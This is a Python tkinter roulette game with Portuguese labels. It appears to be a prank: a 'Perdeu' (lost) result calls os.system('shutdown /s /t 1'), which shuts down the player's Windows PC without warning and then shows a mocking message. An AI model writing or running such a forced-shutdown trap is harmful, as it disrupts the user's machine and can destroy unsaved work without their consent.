import tkinter as tk
import random
import math
import os

# Configurações iniciais
root = tk.Tk()
root.title("Roleta")

# Criar a área da roleta (canvas)
canvas = tk.Canvas(root, width=400, height=400, bg="white")
canvas.pack(pady=20)

# Criar rótulos para exibir frases associadas aos setores
frases_labels = []
for i, (setor, mensagem) in enumerate({
    (0, 60): "Ganhou",
    (60, 120): "Perdeu",
    (120, 180): "Ganhou",
    (180, 240): "Perdeu",
    (240, 300): "Ganhou",
    (300, 360): "Perdeu"
}.items()):
    x = 200 + 120 * math.cos(math.radians(30 + i * 60))
    y = 200 + 120 * math.sin(math.radians(30 + i * 60))
    label = tk.Label(root, text=mensagem)
    frases_labels.append(label)
    canvas.create_window(x, y, window=label)

# Criar a seta inicial
canvas.create_line(200, 200, 300, 200, arrow=tk.LAST, tags="seta", width=2, arrowshape=(16, 20, 8))

# Botão para girar a roleta
girar_button = tk.Button(root, text="Girar Roleta", command=lambda: girar_roleta(frases_labels, canvas))
girar_button.pack(pady=10)

# Rótulo para exibir o resultado
resultado_label = tk.Label(root, text="")
resultado_label.pack(pady=10)

# Função para girar a roleta
def girar_roleta(frases_labels, canvas):
    angulo = random.uniform(0, 360)
    canvas.delete("seta")
    canvas.create_line(200, 200, 200 + 100 * math.cos(math.radians(angulo)), 200 + 100 * math.sin(math.radians(angulo)), arrow=tk.LAST, tags="seta", width=2, arrowshape=(16, 20, 8))

    for setor, mensagem in {
    (0, 60): "Ganhou",
    (60, 120): "Perdeu",
    (120, 180): "Ganhou",
    (180, 240): "Perdeu",
    (240, 300): "Ganhou",
    (300, 360): "Perdeu"
    }.items():
        if setor[0] <= angulo < setor[1]:
            resultado_label.config(text=mensagem)
            if mensagem == "Perdeu":
                desligar_pc()
        if setor[0] <= angulo < setor[1]:
            resultado_label.config(text=mensagem)
            if mensagem == "Ganhou":
                adicionar_pasta()
            break

def adicionar_pasta():
    try:
        # Substitua 'caminho_da_pasta' pelo caminho real da pasta que você deseja adicionar
        os.makedirs('pasta nova')
        resultado_label.config(text="Pasta adicionada com sucesso!")
    except Exception as e:
        resultado_label.config(text=f"Erro ao adicionar a pasta: {e}")

# Função para adicionar uma pasta
def desligar_pc():
    try:
        os.system("shutdown /s /t 1")
        resultado_label.config(text="SE FODEU KKKKKKKK")
    except Exception as e:
        resultado_label.config(text=f"Erro ao desligar pc: {e}")

# Iniciar o loop principal
root.mainloop()
